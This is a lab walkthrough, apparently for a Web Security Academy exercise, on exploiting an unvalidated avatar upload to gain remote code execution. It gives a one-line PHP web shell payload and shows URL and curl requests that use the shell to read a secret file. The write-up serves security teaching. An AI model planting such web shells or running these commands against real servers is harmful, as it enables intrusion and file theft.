# Remote code execution via web shell upload

### Goal - 

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`

### Analysis/Exploitation -

Login as user `wiener`:

**In the lab’s background, it said:**

> This lab contains a vulnerable image upload function. It doesn’t perform any validation on the files users upload before storing them on the server’s filesystem.

Now, If the application doesn’t do any validation on user’s file upload, an attack could upload a web shell to the web server’s filesystem!

**But before we do that, let’s upload a normal file, and intercept the request via Burp Suite:**

When we clicked the `Upload` button, a POST request will be sent to `/my-account/avatar`, with parameters `name='user'`& `name='csrf'` at end after image data.

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/198510e0-dccb-4a69-84aa-c4636e8207cf/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZY6IUFCC%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221946Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD3%2BDzCqhPafbUuR3HqtmkvE0tZRQcIQll%2F8dAJSMIgOwIhAPnUnuj2BuqByGxG%2Bk3kWhlNMSdWZeehYPs%2FUHzo3TESKogECK%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igy%2FhMR3rAVe1kFtiHIq3AOCP9icyS4TjJ2ywjdhFOFwFuKou6Yn1XY%2FFOavSkq7i3s4vnmaBaDRFOfUK71t6X0SlTSryMvJVcGV75Hr9dPGib8n1XPNse1pljjz%2Bnke2Qf%2BSZTIqGouc1j6L6pw8uxNLGrDYuDc0HI5EpBWK9Kj4JFWz10%2Fdcs9FZnaQdWsCZzTTQaUOPg7l1rqHWIt%2BYGlRhgdJzdMaLpt5Hucuw0ml7IjEToQpYiNvr5%2F8G8guco2smR9PGDfjub63Wg05cI5whBbLosgqs9aVTZin5WzYaC9RFp5UEqq%2FyKxk9htnv2KTjf%2FGUCsh6UdNlqsqAi%2FpX5MWD2x2NbcwH5WdKp9UyU6r01r0jsHsKRibkNSspBATqoaM6uIuKNhF2%2FSlr9PQT5lPCyEgqS%2BaxunYAZyqefo1EU0fbbPBZyDU602%2BmW%2FPeTn6aGNxE2UYzFDpWamIhoFrrN9VEs9CWCq6JLJZibujX5JZ49ItQvN6IeYNLulkhwMvByhLHKvaMoJpVepS0DpQWhbsZToU%2BBMVsBxHLJS%2BAGE7shUVJ62EvVFUjJ6E8OlPvsrw16vjo3EF%2BhYPjshmGi7M1EajC5A%2BO3y8A9Lfn92LRjt4LK3krM%2BwDNTkpo2FFns3nckUzC1hKPUBjqkAYCzQVAvenDt0bHNZtM8FwQDf88q5Y%2FfJK1vLpG1JRN1MjSBNXdAFXu30jf9RijkJb8jxX6T90g7Xizh%2FVKLTZsvo5F22MQWTuCrKwicNE%2BVex0vdHpt7pKETHfmJgcLJIZRN4wAZgmCNeVduuqdo9zXxjQGMln1Ne7%2FHMisXTE%2FxqwQsWMUE8og4JClZoDZDWJ53k9MayA4VQGpavxM420BSTeM&X-Amz-Signature=a2c615d5f585f1f9a514a500ab94c02fbe576dae3f85e8a3f9844227cdc7adc0&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

when we click “Back to My Account”, notice that image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>`. 

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/cde8a822-35f5-47fc-9b42-f886f39b12b4/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZY6IUFCC%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221946Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD3%2BDzCqhPafbUuR3HqtmkvE0tZRQcIQll%2F8dAJSMIgOwIhAPnUnuj2BuqByGxG%2Bk3kWhlNMSdWZeehYPs%2FUHzo3TESKogECK%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igy%2FhMR3rAVe1kFtiHIq3AOCP9icyS4TjJ2ywjdhFOFwFuKou6Yn1XY%2FFOavSkq7i3s4vnmaBaDRFOfUK71t6X0SlTSryMvJVcGV75Hr9dPGib8n1XPNse1pljjz%2Bnke2Qf%2BSZTIqGouc1j6L6pw8uxNLGrDYuDc0HI5EpBWK9Kj4JFWz10%2Fdcs9FZnaQdWsCZzTTQaUOPg7l1rqHWIt%2BYGlRhgdJzdMaLpt5Hucuw0ml7IjEToQpYiNvr5%2F8G8guco2smR9PGDfjub63Wg05cI5whBbLosgqs9aVTZin5WzYaC9RFp5UEqq%2FyKxk9htnv2KTjf%2FGUCsh6UdNlqsqAi%2FpX5MWD2x2NbcwH5WdKp9UyU6r01r0jsHsKRibkNSspBATqoaM6uIuKNhF2%2FSlr9PQT5lPCyEgqS%2BaxunYAZyqefo1EU0fbbPBZyDU602%2BmW%2FPeTn6aGNxE2UYzFDpWamIhoFrrN9VEs9CWCq6JLJZibujX5JZ49ItQvN6IeYNLulkhwMvByhLHKvaMoJpVepS0DpQWhbsZToU%2BBMVsBxHLJS%2BAGE7shUVJ62EvVFUjJ6E8OlPvsrw16vjo3EF%2BhYPjshmGi7M1EajC5A%2BO3y8A9Lfn92LRjt4LK3krM%2BwDNTkpo2FFns3nckUzC1hKPUBjqkAYCzQVAvenDt0bHNZtM8FwQDf88q5Y%2FfJK1vLpG1JRN1MjSBNXdAFXu30jf9RijkJb8jxX6T90g7Xizh%2FVKLTZsvo5F22MQWTuCrKwicNE%2BVex0vdHpt7pKETHfmJgcLJIZRN4wAZgmCNeVduuqdo9zXxjQGMln1Ne7%2FHMisXTE%2FxqwQsWMUE8og4JClZoDZDWJ53k9MayA4VQGpavxM420BSTeM&X-Amz-Signature=ce0ea42c640229e8a6ed33bac037664870b0b01a44807d5012c346e051232cdf&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/05c4efad-f9bd-4978-bd13-a5d5925b051b/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZY6IUFCC%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221946Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD3%2BDzCqhPafbUuR3HqtmkvE0tZRQcIQll%2F8dAJSMIgOwIhAPnUnuj2BuqByGxG%2Bk3kWhlNMSdWZeehYPs%2FUHzo3TESKogECK%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igy%2FhMR3rAVe1kFtiHIq3AOCP9icyS4TjJ2ywjdhFOFwFuKou6Yn1XY%2FFOavSkq7i3s4vnmaBaDRFOfUK71t6X0SlTSryMvJVcGV75Hr9dPGib8n1XPNse1pljjz%2Bnke2Qf%2BSZTIqGouc1j6L6pw8uxNLGrDYuDc0HI5EpBWK9Kj4JFWz10%2Fdcs9FZnaQdWsCZzTTQaUOPg7l1rqHWIt%2BYGlRhgdJzdMaLpt5Hucuw0ml7IjEToQpYiNvr5%2F8G8guco2smR9PGDfjub63Wg05cI5whBbLosgqs9aVTZin5WzYaC9RFp5UEqq%2FyKxk9htnv2KTjf%2FGUCsh6UdNlqsqAi%2FpX5MWD2x2NbcwH5WdKp9UyU6r01r0jsHsKRibkNSspBATqoaM6uIuKNhF2%2FSlr9PQT5lPCyEgqS%2BaxunYAZyqefo1EU0fbbPBZyDU602%2BmW%2FPeTn6aGNxE2UYzFDpWamIhoFrrN9VEs9CWCq6JLJZibujX5JZ49ItQvN6IeYNLulkhwMvByhLHKvaMoJpVepS0DpQWhbsZToU%2BBMVsBxHLJS%2BAGE7shUVJ62EvVFUjJ6E8OlPvsrw16vjo3EF%2BhYPjshmGi7M1EajC5A%2BO3y8A9Lfn92LRjt4LK3krM%2BwDNTkpo2FFns3nckUzC1hKPUBjqkAYCzQVAvenDt0bHNZtM8FwQDf88q5Y%2FfJK1vLpG1JRN1MjSBNXdAFXu30jf9RijkJb8jxX6T90g7Xizh%2FVKLTZsvo5F22MQWTuCrKwicNE%2BVex0vdHpt7pKETHfmJgcLJIZRN4wAZgmCNeVduuqdo9zXxjQGMln1Ne7%2FHMisXTE%2FxqwQsWMUE8og4JClZoDZDWJ53k9MayA4VQGpavxM420BSTeM&X-Amz-Signature=3eaae144ee3f4f1d92e52b355e68fd291f0f50856dfdefadaed24c781f524dda&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

Now we know **the exact location of the uploaded file: **`/files/avatars/test.png`**.**

Try to upload PHP web shell

**Payload:**`<?php system($_GET['cmd']); ?>`

> 💡 **<?php system($_GET['cmd']); ?>**
$**_GET** Can collect data that was sent in the URL or submitted in an HTML form.
The command to be executed is obtained from the user's input via the $_GET superglobal array. In this case, the user is expected to pass the command as a query parameter named 'cmd' in the URL.

For example, if the script is hosted at example.com/shell.php, a user could execute a command by visiting:
**http://example.com/shell.php?cmd=ls%20-l**

Use the avatar upload function to upload malicious PHP file

Calling the file will output the content of the secret file:

```text
https://0a7b004f038d0eb58082174300b30087.web-security-academy.net/files/avatars/webShell.php/?cmd=cat%20/home/carlos/secret
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/fa72d605-48e2-4df2-b706-c8dbcaacd18d/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZY6IUFCC%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221946Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD3%2BDzCqhPafbUuR3HqtmkvE0tZRQcIQll%2F8dAJSMIgOwIhAPnUnuj2BuqByGxG%2Bk3kWhlNMSdWZeehYPs%2FUHzo3TESKogECK%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igy%2FhMR3rAVe1kFtiHIq3AOCP9icyS4TjJ2ywjdhFOFwFuKou6Yn1XY%2FFOavSkq7i3s4vnmaBaDRFOfUK71t6X0SlTSryMvJVcGV75Hr9dPGib8n1XPNse1pljjz%2Bnke2Qf%2BSZTIqGouc1j6L6pw8uxNLGrDYuDc0HI5EpBWK9Kj4JFWz10%2Fdcs9FZnaQdWsCZzTTQaUOPg7l1rqHWIt%2BYGlRhgdJzdMaLpt5Hucuw0ml7IjEToQpYiNvr5%2F8G8guco2smR9PGDfjub63Wg05cI5whBbLosgqs9aVTZin5WzYaC9RFp5UEqq%2FyKxk9htnv2KTjf%2FGUCsh6UdNlqsqAi%2FpX5MWD2x2NbcwH5WdKp9UyU6r01r0jsHsKRibkNSspBATqoaM6uIuKNhF2%2FSlr9PQT5lPCyEgqS%2BaxunYAZyqefo1EU0fbbPBZyDU602%2BmW%2FPeTn6aGNxE2UYzFDpWamIhoFrrN9VEs9CWCq6JLJZibujX5JZ49ItQvN6IeYNLulkhwMvByhLHKvaMoJpVepS0DpQWhbsZToU%2BBMVsBxHLJS%2BAGE7shUVJ62EvVFUjJ6E8OlPvsrw16vjo3EF%2BhYPjshmGi7M1EajC5A%2BO3y8A9Lfn92LRjt4LK3krM%2BwDNTkpo2FFns3nckUzC1hKPUBjqkAYCzQVAvenDt0bHNZtM8FwQDf88q5Y%2FfJK1vLpG1JRN1MjSBNXdAFXu30jf9RijkJb8jxX6T90g7Xizh%2FVKLTZsvo5F22MQWTuCrKwicNE%2BVex0vdHpt7pKETHfmJgcLJIZRN4wAZgmCNeVduuqdo9zXxjQGMln1Ne7%2FHMisXTE%2FxqwQsWMUE8og4JClZoDZDWJ53k9MayA4VQGpavxM420BSTeM&X-Amz-Signature=0863498e18e535b171c3a18c16e8ec7e80accb5c1d0db05df658280e1ba3bd21&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

via command line using curl

```bash
curl https://0a7b004f038d0eb58082174300b30087.web-security-academy.net/files/avatars/webShell.php --get --data-urlencode "cmd=cat /home/carlos/secret"
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/47af05bc-20ed-4450-980e-c8b7d176fdda/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZY6IUFCC%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221946Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD3%2BDzCqhPafbUuR3HqtmkvE0tZRQcIQll%2F8dAJSMIgOwIhAPnUnuj2BuqByGxG%2Bk3kWhlNMSdWZeehYPs%2FUHzo3TESKogECK%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igy%2FhMR3rAVe1kFtiHIq3AOCP9icyS4TjJ2ywjdhFOFwFuKou6Yn1XY%2FFOavSkq7i3s4vnmaBaDRFOfUK71t6X0SlTSryMvJVcGV75Hr9dPGib8n1XPNse1pljjz%2Bnke2Qf%2BSZTIqGouc1j6L6pw8uxNLGrDYuDc0HI5EpBWK9Kj4JFWz10%2Fdcs9FZnaQdWsCZzTTQaUOPg7l1rqHWIt%2BYGlRhgdJzdMaLpt5Hucuw0ml7IjEToQpYiNvr5%2F8G8guco2smR9PGDfjub63Wg05cI5whBbLosgqs9aVTZin5WzYaC9RFp5UEqq%2FyKxk9htnv2KTjf%2FGUCsh6UdNlqsqAi%2FpX5MWD2x2NbcwH5WdKp9UyU6r01r0jsHsKRibkNSspBATqoaM6uIuKNhF2%2FSlr9PQT5lPCyEgqS%2BaxunYAZyqefo1EU0fbbPBZyDU602%2BmW%2FPeTn6aGNxE2UYzFDpWamIhoFrrN9VEs9CWCq6JLJZibujX5JZ49ItQvN6IeYNLulkhwMvByhLHKvaMoJpVepS0DpQWhbsZToU%2BBMVsBxHLJS%2BAGE7shUVJ62EvVFUjJ6E8OlPvsrw16vjo3EF%2BhYPjshmGi7M1EajC5A%2BO3y8A9Lfn92LRjt4LK3krM%2BwDNTkpo2FFns3nckUzC1hKPUBjqkAYCzQVAvenDt0bHNZtM8FwQDf88q5Y%2FfJK1vLpG1JRN1MjSBNXdAFXu30jf9RijkJb8jxX6T90g7Xizh%2FVKLTZsvo5F22MQWTuCrKwicNE%2BVex0vdHpt7pKETHfmJgcLJIZRN4wAZgmCNeVduuqdo9zXxjQGMln1Ne7%2FHMisXTE%2FxqwQsWMUE8og4JClZoDZDWJ53k9MayA4VQGpavxM420BSTeM&X-Amz-Signature=91c1f679fe4adaefd5a20829a3dd3726ff4689710e71f271c3fe2d6899d90667&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
